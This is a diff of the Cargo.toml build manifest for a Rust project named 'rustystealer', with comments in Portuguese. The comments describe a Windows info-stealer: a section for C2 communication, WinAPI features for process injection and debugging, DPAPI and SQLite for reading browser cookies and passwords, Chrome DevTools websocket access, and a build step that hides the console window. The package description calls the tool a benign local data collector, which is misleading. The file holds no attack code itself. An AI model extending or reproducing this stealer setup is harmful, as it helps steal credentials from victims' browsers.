@@ -1,30 +1,113 @@
-[package]
+﻿[package]
 name = "rustystealer"
 version = "0.1.0"
 edition = "2021"
+authors = ["Your Name"]
+description = "Ferramenta de automação de coleta de dados locais"
 
+# Configurações de release para gerar um binário pequeno e rápido
 [profile.release]
-opt-level = "z"          # Otimiza tamanho
-lto = true               # Link-time optimization
-codegen-units = 1        # Melhor otimização
-strip = true             # Remove símbolos
-panic = "abort"          # Binário menor
+opt-level = "z"      # Otimiza para o menor tamanho possível
+lto = true           # Link Time Optimization (remove código morto)
+codegen-units = 1    # Melhora a otimização ao custo de tempo de compilação
+strip = true         # Remove símbolos de debug do executável final
+panic = "abort"      # Reduz o tamanho ao não incluir stack unwinding
 
 [dependencies]
+# ============================================================
+# COMUNICAÇÃO COM C2
+# ============================================================
+reqwest = { version = "0.11", features = ["blocking", "json"] }
+websocket = "0.26"           # NOVO: Para DevTools Protocol (Chrome debugging)
+
+# ============================================================
+# WINDOWS API - Essencial para DPAPI, DEPURAÇÃO E INJEÇÃO
+# ============================================================
 winapi = { version = "0.3", features = [
-    "winnt", "minwinbase", "minidumpapiset", "dbghelp",
-    "processthreadsapi", "memoryapi", "handleapi",
-    "securitybaseapi", "winbase", "tlhelp32", "psapi"
+    # Existing (já tinha)
+    "winnt",
+    "minwinbase",
+    "processthreadsapi",
+    "memoryapi",
+    "handleapi",
+    "securitybaseapi",
+    "winbase",
+    "tlhelp32",
+    "errhandlingapi",
+    "fileapi",
+    "namedpipeapi",
+    "dpapi",
+    "wincrypt",
+    "winuser",
+    # NOVOS PARA INJEÇÃO E DEBUGGING
+    "debugapi",          # WaitForDebugEvent, ContinueDebugEvent, DebugActiveProcess
+    "synchapi",          # WaitForSingleObject, CreateMutex
+    "winerror",          # Códigos de erro do Windows
+    "libloaderapi",      # GetModuleHandle, GetProcAddress
+    "shellapi",          # ShellExecute
+    "psapi",             # EnumProcessModules
+    "memoryapi",         # VirtualAllocEx, VirtualFreeEx, ReadProcessMemory
+    "processthreadsapi", # OpenProcess, CreateRemoteThread, GetThreadContext
+    "winreg",            # Acesso ao registro do Windows
 ] }
-windows = "0.58"         # Alternativa moderna
-reqwest = { version = "0.12", features = ["blocking", "rustls-tls"] }
-aes = "0.8"
-cbc = "0.1"
-base64 = "0.22"
-rand = "0.8"
-obfstr = "0.4"           # Ofusca strings
-syscalls = "0.6"         # Syscalls diretos
-dirs = "5.0"             # Paths de sistema
+
+# ============================================================
+# CRIPTOGRAFIA
+# ============================================================
+aes-gcm = "0.10"
+base64 = "0.21"
+
+# ============================================================
+# MANIPULAÇÃO DE ARQUIVOS E PATHS
+# ============================================================
+dirs = "5.0"
+fs4 = "0.7"              # NOVO: Para lock de arquivos
+
+# ============================================================
+# SERIALIZAÇÃO
+# ============================================================
 serde = { version = "1.0", features = ["derive"] }
 serde_json = "1.0"
+serde_bytes = "0.11"     # NOVO: Para manipulação eficiente de bytes
+
+# ============================================================
+# SQLITE (LEITURA DE COOKIES E SENHAS)
+# ============================================================
+rusqlite = { version = "0.29", features = ["bundled"] }
+
+# ============================================================
+# UTILITÁRIOS
+# ============================================================
 chrono = "0.4"
+uuid = { version = "1.6", features = ["v4", "fast-rng"] }  # NOVO: Para gerar IDs únicos
+md5 = "0.7"              # NOVO: Para hash da senha (login do dashboard)
+
+# ============================================================
+# THREADING E CONCORRÊNCIA
+# ============================================================
+crossbeam = "0.8"        # NOVO: Para canais de comunicação entre threads
+once_cell = "1.19"       # NOVO: Para lazy statics
+
+# ============================================================
+# DEBUG E LOGGING
+# ============================================================
+tracing = "0.1"
+tracing-subscriber = { version = "0.3", features = ["env-filter"] }  # NOVO
+anyhow = "1.0"
+
+# ============================================================
+# WEB SOCKET (DevTools Protocol)
+# ============================================================
+tokio-tungstenite = { version = "0.20", features = ["native-tls"] }  # NOVO: WebSocket async
+futures-util = "0.3"     # NOVO: Para streams async
+
+[dev-dependencies]
+# Ferramentas de auxílio durante o desenvolvimento
+tracing = "0.1"
+anyhow = "1.0"
+
+# ============================================================
+# BUILD SCRIPT (Opcional - para otimizações)
+# ============================================================
+[build-dependencies]
+winres = "0.1"           # NOVO: Para remover console window (Windows subsystem)
